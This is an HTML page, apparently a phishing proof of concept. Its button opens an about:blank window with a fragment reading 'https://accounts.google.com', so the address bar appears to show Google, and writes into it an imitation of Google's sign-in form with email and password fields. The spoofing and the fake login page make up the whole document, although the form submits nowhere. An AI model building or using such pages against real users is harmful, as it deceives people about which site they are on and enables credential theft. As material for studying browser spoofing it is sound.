<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Article</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #fff; }
.page { max-width: 400px; margin: 0 auto; padding: 40px 24px; text-align: center; }
.page h2 { font-size: 20px; color: #1d1d1f; margin-bottom: 8px; }
.page p { font-size: 14px; color: #86868b; margin-bottom: 24px; }
.btn { display: inline-block; background: #007aff; color: #fff; border: none; padding: 14px 40px; border-radius: 12px; font-size: 17px; font-weight: 600; text-decoration: none; cursor: pointer; -webkit-tap-highlight-color: transparent; }
.btn:active { opacity: 0.85; }
</style>
</head>
<body>

<div class="page">
  <h2>Continue with Google</h2>
  <p>Sign in to access your account</p>
  <a id="go" class="btn">Sign In with Google</a>
</div>

<script>
document.getElementById('go').addEventListener('click', function(e) {
  e.preventDefault();

  // Open about:blank with fragment showing legitimate URL
  var w = window.open('about:blank#https://accounts.google.com');
  if (!w) return;

  w.document.open();
  w.document.write(
    '<!DOCTYPE html>' +
    '<html><head>' +
    '<meta charset="utf-8">' +
    '<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">' +
    '<title>accounts.google.com</title>' +
    '</head><body style="margin:0;font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#fff;">' +

    '<div style="max-width:360px;margin:40px auto;padding:20px;text-align:center;">' +

    // Google logo
    '<svg viewBox="0 0 272 92" width="120" style="margin-bottom:12px;">' +
    '<text x="0" y="70" font-family="-apple-system,sans-serif" font-size="80" font-weight="500">' +
    '<tspan fill="#4285f4">G</tspan><tspan fill="#ea4335">o</tspan><tspan fill="#fbbc05">o</tspan>' +
    '<tspan fill="#4285f4">g</tspan><tspan fill="#34a853">l</tspan><tspan fill="#ea4335">e</tspan>' +
    '</text></svg>' +

    '<h1 style="font-size:22px;font-weight:400;color:#202124;margin-bottom:4px;">Sign in</h1>' +
    '<p style="font-size:15px;color:#202124;margin-bottom:28px;">to continue to your account</p>' +

    '<input type="email" placeholder="Email or phone" autocomplete="off" ' +
    'style="width:100%;padding:14px 16px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;-webkit-appearance:none;background:#fff;margin-bottom:12px;">' +

    '<input type="password" placeholder="Enter your password" autocomplete="off" ' +
    'style="width:100%;padding:14px 16px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;-webkit-appearance:none;background:#fff;margin-bottom:12px;">' +

    '<div style="text-align:left;margin-bottom:28px;">' +
    '<a style="color:#1a73e8;font-size:14px;text-decoration:none;font-weight:500;">Forgot email?</a></div>' +

    '<p style="font-size:13px;color:#5f6368;text-align:left;margin-bottom:28px;line-height:1.5;">' +
    'Not your device? Use Guest mode to sign in privately. ' +
    '<a style="color:#1a73e8;text-decoration:none;">Learn more</a></p>' +

    '<div style="display:flex;justify-content:space-between;align-items:center;">' +
    '<a style="color:#1a73e8;font-size:14px;text-decoration:none;font-weight:500;">Create account</a>' +
    '<button style="background:#1a73e8;color:white;border:none;padding:10px 24px;border-radius:4px;font-size:14px;font-weight:500;">Next</button>' +
    '</div></div>' +

    '</body></html>'
  );
  w.document.close();
});
</script>

</body>
</html>
